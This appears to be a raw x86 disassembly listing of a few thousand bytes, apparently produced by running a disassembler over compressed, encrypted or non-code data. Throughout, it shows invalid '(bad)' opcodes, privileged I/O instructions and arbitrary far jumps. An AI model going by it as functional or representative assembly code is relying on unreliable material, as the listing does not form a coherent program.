  405944:	jmp    0x5cbf:0x6ceadc4d
  40594b:	xchg   edx,eax
  40594c:	xor    al,0xda
  40594e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40594f:	retf   0x5530
  405952:	or     dh,BYTE PTR [ebx]
  405954:	pop    esp
  405955:	sbb    BYTE PTR [edx+0x38],0x9
  405959:	mov    eax,0x7fef3291
  40595e:	cmp    esi,DWORD PTR [esi-0x699f0cb0]
  405964:	push   ebp
  405965:	in     al,dx
  405966:	pushf  
  405967:	mov    ds,ebx
  405969:	mov    al,0xb0
  40596b:	maxps  xmm5,XMMWORD PTR [ecx]
  40596e:	jp     0x405985
  405970:	jmp    0xafa4:0xd6611242
  405977:	imul   edi,DWORD PTR [eax+0x7e91e159],0xffffffce
  40597e:	outs   dx,BYTE PTR ds:[esi]
  40597f:	add    cl,BYTE PTR [edx+0x286b288d]
  405985:	outs   dx,BYTE PTR ds:[esi]
  405986:	test   DWORD PTR [edi+eax*2],edx
  405989:	sahf   
  40598a:	push   esp
  40598b:	add    BYTE PTR [ecx+0x40],dh
  40598e:	mov    esp,0x42a107a6
  405993:	inc    ebx
  405994:	cdq    
  405995:	stos   DWORD PTR es:[edi],eax
  405996:	mov    ebx,0x53f1cb3f
  40599b:	pop    es
  40599c:	xor    DWORD PTR [eax-0x10fd406f],edx
  4059a2:	xchg   eax,ebp
  4059a4:	or     eax,0xedd6c752
  4059a9:	in     eax,0xfb
  4059ab:	or     DWORD PTR [ecx+0x22],esi
  4059ae:	xchg   ebp,eax
  4059af:	aas    
  4059b0:	popf   
  4059b1:	push   esi
  4059b2:	add    eax,0x928b1cc5
  4059b7:	sub    bh,BYTE PTR [esi+0x7b26fcd1]
  4059bd:	bound  ebx,QWORD PTR [ebp+0x3b]
  4059c0:	or     esp,DWORD PTR [edi]
  4059c2:	dec    eax
  4059c3:	sbb    al,BYTE PTR [ecx+0x27]
  4059c6:	hlt    
  4059c7:	ds mov dl,0x69
  4059ca:	mov    al,0x8
  4059cc:	xchg   ecx,eax
  4059cd:	cmp    al,0x10
  4059cf:	jae    0x4059fc
  4059d1:	jle    0x405a05
  4059d3:	xor    eax,0xbfdca392
  4059d8:	mov    eax,0x204a6f67
  4059dd:	sbb    eax,0xa9e6763b
  4059e2:	jmp    0x405a16
  4059e4:	mov    BYTE PTR ds:0x74e25b6d,0x9e
  4059eb:	int    0x3a
  4059ed:	out    0x16,eax
  4059ef:	and    DWORD PTR [edi-0x60e8b3e3],ebx
  4059f5:	mov    dl,BYTE PTR [esi-0x7dfa5863]
  4059fb:	pop    ebx
  4059fc:	jg     0x4059e7
  4059fe:	push   ebx
  4059ff:	xlat   BYTE PTR ds:[ebx]
  405a00:	xchg   ebx,eax
  405a01:	xlat   BYTE PTR ds:[ebx]
  405a02:	push   ss
  405a03:	gs out dx,eax
  405a05:	out    0x44,eax
  405a07:	cmp    bl,al
  405a09:	mov    edx,0x3b337c5b
  405a0e:	mov    BYTE PTR [edx],bh
  405a10:	push   eax
  405a11:	fstp   QWORD PTR [edx]
  405a13:	mov    edx,0x9f2c083c
  405a18:	sub    cl,BYTE PTR cs:[ebx+0x17]
  405a1c:	add    DWORD PTR [ecx],edx
  405a1e:	and    esp,DWORD PTR [esi+0x20]
  405a21:	ins    DWORD PTR es:[edi],dx
  405a22:	out    dx,al
  405a23:	aaa    
  405a24:	mov    gs,WORD PTR [esi]
  405a26:	ret    
  405a27:	mov    ch,0xb6
  405a29:	jmp    0x1e4:0xb3131ce5
  405a30:	xchg   edx,eax
  405a31:	and    al,dh
  405a33:	lea    edx,[ebx-0x73]
  405a36:	pop    edi
  405a37:	ss cld 
  405a39:	or     BYTE PTR [esi],al
  405a3b:	imul   BYTE PTR [ebp-0x601426d9]
  405a41:	aad    0x93
  405a43:	mov    ah,0xbe
  405a45:	out    0x2b,al
  405a47:	inc    eax
  405a48:	test   al,0x52
  405a4a:	pop    ss
  405a4b:	mov    bh,ch
  405a4d:	pop    ecx
  405a4e:	(bad)  
  405a4f:	cmp    dh,ch
  405a51:	es adc al,0xde
  405a54:	push   0x76d67c0e
  405a59:	jbe    0x405ac9
  405a5b:	push   ebp
  405a5c:	mov    eax,0xd350b2d6
  405a61:	adc    al,0x2a
  405a63:	inc    eax
  405a64:	jecxz  0x405a98
  405a66:	ret    0x50d7
  405a69:	nop
  405a6a:	leave  
  405a6b:	and    eax,0x23bf2368
  405a70:	test   al,0xa3
  405a72:	cmp    cl,BYTE PTR [esi-0x7bf8907b]
  405a78:	dec    esp
  405a79:	cld    
  405a7a:	jb     0x405ad9
  405a7c:	inc    edx
  405a7d:	push   ebx
  405a7e:	nop
  405a7f:	xchg   ah,bl
  405a81:	int    0x67
  405a83:	outs   dx,DWORD PTR ds:[esi]
  405a84:	mov    esi,0x7dcf6ea0
  405a89:	jecxz  0x405a63
  405a8b:	in     al,dx
  405a8c:	mov    esp,0x8696942b
  405a91:	mov    eax,ds:0x9ad53018
  405a96:	call   0x16fa14a5
  405a9b:	jo     0x405a62
  405a9d:	push   ds
  405a9e:	daa    
  405a9f:	sbb    esp,esi
  405aa1:	add    DWORD PTR [eax+0x43],0x9d26b822
  405aa8:	mov    esi,0x778d8d7c
  405aad:	and    eax,ebp
  405aaf:	xchg   ebp,eax
  405ab0:	icebp  
  405ab1:	loope  0x405ab0
  405ab3:	and    al,0x39
  405ab5:	add    al,0xa6
  405ab7:	ins    DWORD PTR es:[edi],dx
  405ab8:	aad    0x31
  405aba:	in     al,dx
  405abb:	lods   al,BYTE PTR ds:[esi]
  405abc:	clc    
  405abd:	jge    0x405a9a
  405abf:	jae    0x405abc
  405ac1:	pop    edx
  405ac2:	pop    ecx
  405ac3:	xor    DWORD PTR [esi+0xafddda5],ebp
  405ac9:	mov    edx,0xc4078753
  405ace:	rol    BYTE PTR [eax+0x4437f27],1
  405ad4:	dec    edx
  405ad5:	adc    eax,esp
  405ad7:	imul   DWORD PTR [eax-0x1]
  405ada:	inc    edx
  405adb:	sbb    cl,BYTE PTR [eax]
  405add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ade:	add    DWORD PTR [ecx+0x27],ebp
  405ae1:	xlat   BYTE PTR ds:[ebx]
  405ae2:	aas    
  405ae3:	xchg   edi,eax
  405ae4:	sbb    al,0xce
  405ae6:	jmp    0x405ad3
  405ae8:	nop
  405ae9:	dec    edx
  405aea:	inc    edi
  405aeb:	pop    esi
  405aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aed:	inc    ebp
  405aee:	mov    ebp,0x3a0ead9
  405af3:	and    BYTE PTR [esp+edi*1-0x356f91b9],dh
  405afa:	pop    esp
  405afb:	push   ds
  405afc:	scas   eax,DWORD PTR es:[edi]
  405afd:	shl    DWORD PTR [ecx+0x2e820e3e],cl
  405b03:	mov    ebp,0x45ea04f6
  405b08:	imul   eax,DWORD PTR [esi],0xffffff8f
  405b0b:	stos   DWORD PTR es:[edi],eax
  405b0c:	loopne 0x405b32
  405b0e:	std    
  405b0f:	into   
  405b10:	or     ebx,DWORD PTR [edx]
  405b12:	jmp    0x405b60
  405b14:	cs loope 0x405aba
  405b17:	rcl    BYTE PTR [esi+0x60],1
  405b1a:	pop    edi
  405b1b:	test   DWORD PTR [ecx+0x0],ecx
  405b1e:	dec    ebp
  405b1f:	frstor [edi]
  405b21:	or     DWORD PTR [eax-0x7dad7139],esi
  405b27:	mov    edi,0x6d189cfb
  405b2c:	leave  
  405b2d:	dec    ecx
  405b2e:	lds    edx,FWORD PTR [eax+0x2]
  405b31:	or     eax,esi
  405b33:	pop    ebx
  405b34:	push   ebx
  405b35:	pushf  
  405b36:	aas    
  405b37:	icebp  
  405b38:	lock jmp FWORD PTR [eax+eiz*2+0x79]
  405b3d:	mov    ds:0xf6d069ac,eax
  405b42:	sbb    DWORD PTR ds:0x66843eb6,eax
  405b48:	test   al,0x81
  405b4a:	cmp    bl,bh
  405b4c:	stc    
  405b4d:	nop
  405b4e:	clc    
  405b4f:	jl     0x405b77
  405b51:	mov    eax,edi
  405b53:	lods   al,BYTE PTR ds:[esi]
  405b54:	repz cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405b57:	and    cl,bl
  405b59:	fist   DWORD PTR [eax-0x1905534b]
  405b5f:	or     al,0x71
  405b61:	adc    al,0x9c
  405b63:	into   
  405b64:	push   edi
  405b65:	xor    al,al
  405b67:	or     dh,BYTE PTR [esi-0x42]
  405b6a:	scas   al,BYTE PTR es:[edi]
  405b6b:	imul   edi,DWORD PTR [ebp+0x62],0xffffffcb
  405b6f:	lea    eax,[esi]
  405b71:	push   edi
  405b72:	int3   
  405b73:	xchg   edi,eax
  405b74:	sub    bh,0x1
  405b77:	pand   mm6,mm1
  405b7a:	add    eax,0x9c237ad7
  405b7f:	(bad)  
  405b80:	xchg   ebx,eax
  405b81:	inc    ebp
  405b82:	test   DWORD PTR [ebp-0x3],edx
  405b85:	cmp    al,0x5
  405b87:	jne    0x405b8a
  405b89:	loop   0x405bcb
  405b8b:	(bad)  
  405b8c:	out    dx,al
  405b8d:	mov    ah,0x5b
  405b8f:	lods   eax,DWORD PTR ds:[esi]
  405b90:	lahf   
  405b91:	aas    
  405b92:	pop    ds
  405b93:	(bad)
  405b97:	out    dx,al
  405b98:	sti    
  405b99:	test   al,0x79
  405b9b:	mov    esi,0x74981592
  405ba0:	lahf   
  405ba1:	and    BYTE PTR [edi-0x41],ch
  405ba4:	push   0x19
  405ba6:	int3   
  405ba7:	in     eax,0xdc
  405ba9:	leave  
  405baa:	pop    DWORD PTR [eax+0x62]
  405bad:	test   al,0x21
  405baf:	or     BYTE PTR [eax+0x19bc6d4c],al
  405bb5:	add    dl,dl
  405bb7:	leave  
  405bb8:	test   eax,0xbcedcc39
  405bbd:	xor    BYTE PTR [edi+0x67693949],cl
  405bc3:	cld    
  405bc4:	fsub   QWORD PTR [ecx-0x1e]
  405bc7:	aas    
  405bc8:	(bad)  
  405bc9:	enter  0x5287,0xcf
  405bcd:	shl    DWORD PTR [ecx+esi*2],cl
  405bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd1:	xchg   esi,eax
  405bd2:	or     ebx,DWORD PTR [ecx-0x253e50d2]
  405bd8:	xor    eax,DWORD PTR [esi-0x47]
  405bdb:	in     eax,0x2d
  405bdd:	xlat   BYTE PTR ds:[ebx]
  405bde:	hlt    
  405bdf:	addr16 mov esi,0xbf115c40
  405be5:	or     DWORD PTR [ecx+0x77],ecx
  405be8:	jle    0x405c47
  405bea:	dec    esp
  405bec:	mov    eax,0x4c30de94
  405bf1:	mov    esp,fs
  405bf3:	mov    dh,0x88
  405bf5:	jb     0x405c45
  405bf7:	fwait
  405bf8:	jmp    0x405bf7
  405bfa:	push   ebx
  405bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bfc:	jb     0x405c70
  405bfe:	jl     0x405c26
  405c00:	(bad)  
  405c01:	pop    edx
  405c02:	cmp    ecx,DWORD PTR [edx]
  405c04:	retf   0xb02e
  405c07:	lea    ebx,[ebp-0x3ad53dd3]
  405c0d:	xor    BYTE PTR [eax-0x7a],al
  405c10:	cwde   
  405c11:	sub    DWORD PTR [edi+0x3a],esp
  405c14:	stos   BYTE PTR es:[edi],al
  405c15:	and    edx,DWORD PTR [esi-0x3718a6ca]
  405c1b:	jns    0x405c3d
  405c1d:	data16 lods al,BYTE PTR ds:[esi]
  405c1f:	jp     0x405bd7
  405c21:	scas   al,BYTE PTR es:[edi]
  405c22:	pop    ss
  405c23:	jb     0x405c18
  405c25:	mov    eax,DWORD PTR [edi+ebp*4+0xf]
  405c29:	fmul   QWORD PTR [ebp+ebx*8+0x4ab21b48]
  405c30:	scas   al,BYTE PTR es:[edi]
  405c31:	push   edx
  405c32:	inc    ecx
  405c33:	or     DWORD PTR [ecx+ecx*2],0xed3d3842
  405c3a:	sbb    eax,0xe8eb3a00
  405c3f:	lds    ebx,FWORD PTR [esi-0x57bcf48b]
  405c45:	pop    esi
  405c46:	jns    0x405bcc
  405c48:	inc    ebx
  405c49:	inc    BYTE PTR [edx-0x26c410b8]
  405c4f:	jmp    0x38cf:0x871dcf96
  405c56:	mov    edx,ss
  405c58:	mov    ecx,DWORD PTR cs:[edi-0x22]
  405c5c:	jle    0x405cbf
  405c5e:	xchg   ecx,eax
  405c5f:	fs xor eax,0xaa7f39fa
  405c65:	cmp    ebx,DWORD PTR [ecx-0x6cf7334a]
  405c6b:	adc    edi,DWORD PTR [eax-0xc]
  405c6e:	mov    cs:0x222cfacc,al
  405c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c75:	lea    esp,[esi+0x2d]
  405c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c79:	pop    ss
  405c7a:	adc    BYTE PTR [eax+0x4b31244d],dl
  405c80:	mov    ds:0x84477eeb,eax
  405c85:	cmp    edx,0xae2c71fb
  405c8b:	adc    bh,dh
  405c8d:	in     al,0x99
  405c8f:	jnp    0x405c42
  405c91:	fmul   DWORD PTR [edx]
  405c93:	push   edx
  405c94:	into   
  405c95:	loopne 0x405cb3
  405c97:	(bad)  
  405c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c99:	add    DWORD PTR [ebx+0x63],ebx
  405c9c:	sub    eax,0xa5a582fd
  405ca1:	(bad)  
  405ca2:	fnsave [esi-0x7]
  405ca5:	sbb    BYTE PTR [ebx+0x59],al
  405ca8:	and    esi,ebx
  405caa:	ror    DWORD PTR [esi+ebp*4-0x4e],1
  405cae:	cwde   
  405caf:	or     ch,bh
  405cb1:	out    0xea,al
  405cb3:	dec    eax
  405cb4:	test   al,0x3a
  405cb6:	cmp    dl,BYTE PTR [esi-0x3b]
  405cb9:	cs push ecx
  405cbb:	xlat   BYTE PTR ds:[ebx]
  405cbc:	adc    dl,BYTE PTR [ebx-0x2c]
  405cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cc1:	aam    0x2c
  405cc3:	arpl   bp,dx
  405cc5:	ss (bad) 
  405cc7:	dec    ebx
  405cc8:	addr16 aam 0x91
  405ccb:	add    DWORD PTR [esi],0xffffffcf
  405cce:	push   ds
  405ccf:	cs pop eax
  405cd1:	jmp    0x405cc6
  405cd3:	and    al,0x8
  405cd5:	dec    esi
  405cd6:	dec    BYTE PTR [ecx]
  405cd8:	and    BYTE PTR [eax],ch
  405cda:	jmp    0x21db:0x3034b053
  405ce1:	push   esi
  405ce2:	cmp    ecx,DWORD PTR [ebx+0x3b]
  405ce5:	dec    esi
  405ce6:	cmp    ah,bh
  405ce8:	mov    esp,esi
  405cea:	ror    BYTE PTR [ecx],0xe5
  405ced:	push   edx
  405cee:	int    0x73
  405cf0:	fnstcw WORD PTR [ecx]
  405cf2:	mov    eax,ds:0x7f787450
  405cf7:	int    0xc3
  405cf9:	jp     0x405d71
  405cfb:	fild   WORD PTR [eax-0x17f540d7]
  405d01:	add    DWORD PTR ds:0x5480aee1,esi
  405d07:	or     DWORD PTR cs:[eax],edi
  405d0a:	imul   esi,DWORD PTR [edx+0x65],0xe18676dc
  405d11:	inc    eax
  405d12:	pop    esp
  405d13:	xchg   ebp,eax
  405d14:	das    
  405d15:	retf   
  405d16:	cmp    eax,0xc0844c93
  405d1b:	inc    esp
  405d1c:	stos   BYTE PTR es:[edi],al
  405d1d:	ds mov esp,0x2b771c46
  405d23:	or     dl,al
  405d25:	pop    es
  405d26:	(bad)  
  405d27:	nop
  405d28:	cmp    dh,ah
  405d2a:	cmp    al,0xec
  405d2c:	call   0x53fb:0x83204515
  405d33:	inc    ebx
  405d34:	xchg   edx,eax
  405d35:	add    ah,bh
  405d37:	aam    0x8
  405d39:	addr16 push es
  405d3b:	pop    ecx
  405d3c:	gs out 0xb6,eax
  405d3f:	jp     0x405cf1
  405d41:	rcr    DWORD PTR [ebp-0x1b44e7cc],1
  405d47:	imul   ebp,DWORD PTR [ebx+ecx*2],0xffffffc8
  405d4b:	outs   dx,DWORD PTR ds:[esi]
  405d4c:	and    edi,DWORD PTR [edx+0x17443b97]
  405d52:	mov    ebp,0x5b87f82
  405d57:	in     eax,dx
  405d58:	sub    al,ch
  405d5a:	or     BYTE PTR [eax-0x26d49253],dh
  405d60:	mov    ebp,esi
  405d62:	mov    tr1,ebp
  405d65:	mov    ecx,0xaf2484b1
  405d6a:	sub    ebx,ebx
  405d6c:	data16 adc BYTE PTR [ebx-0x39cf50f1],cl
  405d73:	into   
  405d74:	push   edi
  405d75:	pop    esi
  405d76:	test   al,0x5b
  405d78:	sbb    bh,BYTE PTR [eax+0xa]
  405d7b:	mov    al,ds:0xa7a64f86
  405d80:	inc    esp
  405d81:	sti    
  405d82:	ss sti 
  405d84:	(bad)  [edx]
  405d86:	mov    cl,0xd2
  405d88:	cmp    esp,DWORD PTR [ebx]
  405d8a:	jge    0x405d89
  405d8c:	imul   ebx,DWORD PTR [ecx-0x2b],0xffffffe2
  405d90:	or     al,0x5d
  405d92:	push   ss
  405d93:	dec    ebp
  405d94:	push   ebp
  405d95:	inc    eax
  405d96:	(bad)  
  405d97:	cld    
  405d98:	sub    bh,BYTE PTR [esi+ebp*4+0xb]
  405d9c:	scas   al,BYTE PTR es:[edi]
  405d9d:	fld    DWORD PTR [ebp+0x140f225b]
  405da3:	in     al,dx
  405da4:	mov    eax,0xf3ce7e9c
  405da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405daa:	sbb    edi,esi
  405dac:	mov    ds:0xb0ef6c70,eax
  405db1:	add    BYTE PTR [ebx-0x50],0x6b
  405db5:	stc    
  405db6:	adc    eax,DWORD PTR [eax-0x25e2479c]
  405dbc:	mov    esp,0x3853caf
  405dc1:	loopne 0x405dcc
  405dc3:	lods   eax,DWORD PTR ds:[esi]
  405dc4:	cmp    esi,DWORD PTR [edx+0x7b]
  405dc7:	nop
  405dc8:	push   0xffffffb2
  405dca:	sub    al,0x8d
  405dcc:	scas   al,BYTE PTR es:[edi]
  405dcd:	inc    ebp
  405dce:	or     BYTE PTR [esi],dl
  405dd0:	sub    DWORD PTR [edx+0x28d4708],ecx
  405dd6:	(bad)  
  405dd7:	shr    ah,0xe8
  405dda:	popf   
  405ddb:	xchg   edx,eax
  405ddc:	jp     0x405dd6
  405dde:	mov    al,0x38
  405de0:	cmp    eax,0xd1eb2de4
  405de5:	mov    ecx,0xee729ad7
  405dea:	(bad)  
  405deb:	xlat   BYTE PTR ds:[ebx]
  405dec:	adc    DWORD PTR [edx],esi
  405dee:	jg     0x405d78
  405df0:	inc    ebp
  405df1:	jmp    0x405dc5
  405df3:	dec    edx
  405df4:	or     bh,al
  405df6:	(bad)  
  405df7:	out    dx,al
  405df8:	call   0xda47:0xefa37ba2
  405dff:	mov    edi,esp
  405e01:	sahf   
  405e02:	add    DWORD PTR [ecx],eax
  405e04:	mov    edx,0x33f52b7a
  405e09:	jnp    0x405e79
  405e0b:	sub    ebp,ebx
  405e0d:	push   ebp
  405e0e:	jne    0x405ddb
  405e10:	jb     0x405e3f
  405e12:	iret   
  405e13:	sbb    eax,0x3b13ec41
  405e18:	aad    0xa3
  405e1a:	sbb    ebx,DWORD PTR [edx+eiz*1-0x52]
  405e1e:	std    
  405e1f:	add    BYTE PTR [ebp+0x45],bh
  405e22:	push   eax
  405e23:	icebp  
  405e24:	repz pop esp
  405e26:	pop    es
  405e27:	out    0x36,eax
  405e29:	sub    al,0x4c
  405e2b:	mov    esp,0x958a18b5
  405e30:	xor    eax,0xded45492
  405e35:	and    ebx,DWORD PTR [edx]
  405e37:	mov    edi,0x9b9eaa48
  405e3c:	dec    esp
  405e3d:	push   es
  405e3e:	xor    eax,0x23036ee4
  405e43:	fcomp  DWORD PTR [edx]
  405e45:	push   esi
  405e46:	ror    DWORD PTR [ecx-0x2691c641],0xd8
  405e4d:	and    al,0xa9
  405e4f:	jmp    0xf530:0xc726423b
  405e56:	retf   0xa111
  405e59:	out    0xdb,eax
  405e5b:	cmc    
  405e5c:	test   al,0xed
  405e5e:	cmp    DWORD PTR [edi],0xf9f589f7
  405e64:	pop    eax
  405e65:	adc    al,0xfe
  405e67:	sahf   
  405e68:	sub    al,0x5
  405e6a:	iret   
  405e6b:	or     ch,BYTE PTR [eax+ecx*8+0x4f]
  405e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e70:	xor    dh,BYTE PTR [eax+0x54]
  405e73:	pop    eax
  405e74:	push   ss
  405e75:	fcomp  st(5)
  405e77:	jl     0x405ec6
  405e79:	xchg   ebp,eax
  405e7a:	ds xchg esi,eax
  405e7c:	lahf   
  405e7d:	pusha  
  405e7e:	(bad)  
  405e7f:	js     0x405e5a
  405e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e82:	jmp    0xfa73:0xcdc2d067
  405e89:	sbb    al,0x6d
  405e8b:	mov    ds:0x59a81ec2,al
  405e90:	call   0x1487b684
  405e95:	and    bh,al
  405e97:	sbb    BYTE PTR [eax-0x7b],bh
  405e9a:	mov    ebx,0xf6c101cd
  405e9f:	pop    es
  405ea0:	push   ss
  405ea1:	retf   
  405ea2:	jmp    0x405e67
  405ea4:	loop   0x405ec5
  405ea6:	or     BYTE PTR [ebx-0x6383ba06],bl
  405eac:	xchg   esi,eax
  405ead:	retf   0xd945
  405eb0:	retf   
  405eb1:	inc    ebx
  405eb2:	repz jbe 0x405e93
  405eb5:	sub    BYTE PTR [ecx-0x5991f40b],cl
  405ebb:	mov    cl,BYTE PTR [ebx+0x63]
  405ebe:	and    al,0xe6
  405ec0:	ins    BYTE PTR es:[edi],dx
  405ec1:	sbb    al,0xcc
  405ec3:	aaa    
  405ec4:	mov    eax,ds:0xf06ae03e
  405ec9:	push   0xffffffeb
  405ecb:	push   ebp
  405ecc:	(bad)  
  405ecd:	and    BYTE PTR [ebp-0x3cecea4],cl
  405ed3:	std    
  405ed4:	sbb    eax,0x7c5ec148
  405ed9:	js     0x405eac
  405edb:	inc    esp
  405edc:	and    al,0x38
  405ede:	pop    ds
  405edf:	daa    
  405ee0:	imul   edx,esp,0x48f67fe9
  405ee6:	cmp    eax,0x528c723f
  405eeb:	mov    ebp,0x93d6fcd7
  405ef0:	imul   ebx,DWORD PTR [eax+0x6342e306],0xfffffff7
  405ef7:	int    0xd
  405ef9:	jmp    0x36a43506
  405efe:	xchg   BYTE PTR [eax+0x6],ah
  405f01:	sahf   
  405f02:	nop
  405f03:	jp     0x405f31
  405f05:	mov    ds:0xc8848028,eax
  405f0a:	xor    bh,0x91
  405f0d:	xchg   ebp,eax
  405f0e:	in     al,0x25
  405f10:	mov    ebx,0x301f5e98
  405f15:	dec    ebp
  405f16:	rep stos BYTE PTR es:[edi],al
  405f18:	push   ebp
  405f19:	push   esi
  405f1a:	fild   DWORD PTR [edx-0x19]
  405f1d:	test   eax,0x66d7332c
  405f22:	add    dh,BYTE PTR [ebx+0x37924d99]
  405f28:	mov    edx,0x1ac5d32a
  405f2d:	xchg   edx,eax
  405f2e:	pop    ebp
  405f2f:	xchg   ebx,eax
  405f30:	ins    BYTE PTR es:[edi],dx
  405f31:	or     eax,0x6021456
  405f36:	aaa    
  405f37:	or     DWORD PTR [ebx-0x12281565],0xf87b902c
  405f41:	lods   eax,DWORD PTR ds:[esi]
  405f42:	jecxz  0x405f79
  405f44:	mov    dl,0xdb
  405f46:	mov    ch,BYTE PTR [ecx-0x3995b4c8]
  405f4c:	into   
  405f4d:	fcom   QWORD PTR es:[esi-0x1e]
  405f51:	fstp   TBYTE PTR [edi-0x2f]
  405f54:	je     0x405f97
  405f56:	and    eax,0x9d6c963d
  405f5b:	data16 jno 0x405f5e
  405f5e:	sbb    DWORD PTR [esi+0x4e],edi
  405f61:	cmp    eax,0x7b166ec4
  405f66:	es push edi
  405f68:	or     BYTE PTR [edx+eax*1-0x7b7f7eec],dh
  405f6f:	xchg   esi,eax
  405f70:	push   cs
  405f71:	add    eax,0x301eee98
  405f76:	add    ebx,DWORD PTR [eax]
  405f78:	xor    BYTE PTR [edx+ecx*1],bl
  405f7b:	jmp    0x405fd0
  405f7d:	and    ebx,esi
  405f7f:	fmul   QWORD PTR [ebx]
  405f81:	mov    DWORD PTR [edi+0x61],edx
  405f84:	ds sub al,0x67
  405f87:	dec    edi
  405f88:	dec    ecx
  405f89:	mov    al,ds:0xfd4aa9b4
  405f8e:	repz ja 0x405f8f
  405f91:	mov    WORD PTR [ebx-0x17],es
  405f94:	inc    ecx
  405f95:	call   0x3e4f9b5d
  405f9a:	popa   
  405f9b:	test   DWORD PTR [ebp+0x1b],0x247058c3
  405fa2:	pop    esp
  405fa3:	repnz push ss
  405fa5:	sub    bh,al
  405fa7:	std    
  405fa8:	rol    DWORD PTR [ebp-0x3492a1fc],cl
  405fae:	(bad)  
  405faf:	fdivr  QWORD PTR [esi-0x471826f7]
  405fb5:	push   ss
  405fb6:	stos   DWORD PTR es:[edi],eax
  405fb7:	div    BYTE PTR [edx+0x7f]
  405fba:	int    0x4c
  405fbc:	sub    al,0x43
  405fbe:	cmc    
  405fbf:	inc    edi
  405fc0:	test   DWORD PTR [eax+0x48],edi
  405fc3:	(bad)  
  405fc5:	jnp    0x406021
  405fc7:	cmp    edi,edi
  405fc9:	test   DWORD PTR [edx+0x1c155699],edx
  405fcf:	dec    ebx
  405fd0:	call   0x7ff8cefe
  405fd5:	push   edi
  405fd6:	add    bh,BYTE PTR [edx]
  405fd8:	jmp    0xc3da:0xf03d3d23
  405fdf:	loope  0x405fce
  405fe1:	jge    0x405ff5
  405fe3:	or     ebp,DWORD PTR [esi+esi*2+0x58]
  405fe7:	xchg   bh,ch
  405fe9:	daa    
  405fea:	jns    0x406021
  405fec:	and    dh,BYTE PTR [edx-0x6e]
  405fef:	enter  0xc79a,0x55
  405ff3:	pop    ecx
  405ff4:	xchg   esi,eax
  405ff5:	ja     0x405ff8
  405ff7:	test   BYTE PTR [edx],al
  405ff9:	dec    eax
  405ffa:	dec    esi
  405ffb:	inc    edx
  405ffc:	xchg   edi,eax
  405ffd:	jp     0x405fa7
  405fff:	clc    
  406000:	loopne 0x405fa8
  406002:	test   al,0x22
  406004:	loop   0x406082
  406006:	(bad)  
  406007:	cmc    
  406008:	jns    0x406055
  40600a:	inc    edx
  40600b:	xchg   esp,eax
  40600c:	ss push eax
  40600e:	mov    WORD PTR [ebx-0x41],es
  406011:	stos   DWORD PTR es:[edi],eax
  406012:	jp     0x405ffa
  406014:	xcrypt-ecb (bad)
  406015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406016:	or     DWORD PTR [eax+0x6c5668c3],ecx
  40601c:	xor    eax,0x847d1707
  406021:	imul   eax,edx,0x1289824c
  406027:	pop    eax
  406028:	arpl   bx,dx
  40602a:	les    ecx,FWORD PTR [eax-0x3f]
  40602d:	jecxz  0x40608e
  40602f:	dec    ecx
  406030:	push   es
  406031:	pop    esp
  406032:	imul   BYTE PTR [ebx+0x7b]
  406035:	ss es daa 
  406038:	(bad)  
  406039:	jns    0x406057
  40603b:	ins    BYTE PTR es:[edi],dx
  40603c:	xchg   ecx,eax
  40603d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603e:	jbe    0x40600c
  406040:	rol    BYTE PTR [esi+0x6],0xc1
  406044:	mov    ds:0x82bd2f6b,al
  406049:	mov    dh,0x6f
  40604b:	loop   0x406015
  40604d:	call   0xae8f:0x167604fc
  406054:	add    al,0xad
  406056:	retf   
  406057:	mov    esi,0xca6f4810
  40605c:	cwde   
  40605d:	scas   al,BYTE PTR es:[edi]
  40605e:	stos   BYTE PTR es:[edi],al
  40605f:	gs fwait
  406061:	xor    eax,0x40119152
  406066:	repnz pusha 
  406068:	xor    BYTE PTR [eax-0x5bdfa3b5],0x76
  40606f:	push   ebx
  406070:	pop    edi
  406071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406072:	jnp    0x4060c2
  406074:	int    0x54
  406076:	adc    al,0x36
  406078:	cmp    eax,ebx
  40607a:	addr16 push cs
  40607c:	add    eax,0x4e1a37b
  406081:	xchg   edx,eax
  406082:	repnz and BYTE PTR [edx+0x610f4380],0xa0
  40608a:	adc    eax,0x91df13a4
  40608f:	outs   dx,BYTE PTR ds:[esi]
  406090:	retf   0x588
  406093:	add    bh,BYTE PTR [esi-0x2c]
  406096:	popa   
  406097:	jge    0x406069
  406099:	hlt    
  40609a:	sub    eax,0x4b04d53b
  40609f:	iret   
  4060a0:	dec    ecx
  4060a1:	jo     0x4060e8
  4060a3:	gs into 
  4060a5:	jmp    0x8c6e:0xb3ad2a27
  4060ac:	dec    edi
  4060ad:	pop    ds
  4060ae:	frstor [eax-0x1132d237]
  4060b4:	push   0x27
  4060b6:	sbb    al,0xd6
  4060b8:	popf   
  4060b9:	sub    al,0x7a
  4060bb:	or     ch,dl
  4060bd:	aam    0xd4
  4060bf:	dec    edx
  4060c0:	(bad)  
  4060c1:	ins    DWORD PTR es:[edi],dx
  4060c2:	jbe    0x4060d8
  4060c4:	adc    al,0x45
  4060c6:	sub    edx,0x509f0403
  4060cc:	imul   esi,DWORD PTR [ebx],0xd70b44ed
  4060d2:	pop    ecx
  4060d3:	push   esi
  4060d4:	xor    DWORD PTR [ecx-0x3306248c],ebp
  4060da:	ins    BYTE PTR es:[edi],dx
  4060db:	push   edi
  4060dc:	aas    
  4060dd:	adc    eax,0x3351efed
  4060e2:	out    dx,eax
  4060e3:	ret    
  4060e4:	xchg   ebx,eax
  4060e5:	push   ebp
  4060e6:	xor    ebp,DWORD PTR ss:[eax]
  4060e9:	iret   
  4060ea:	push   esp
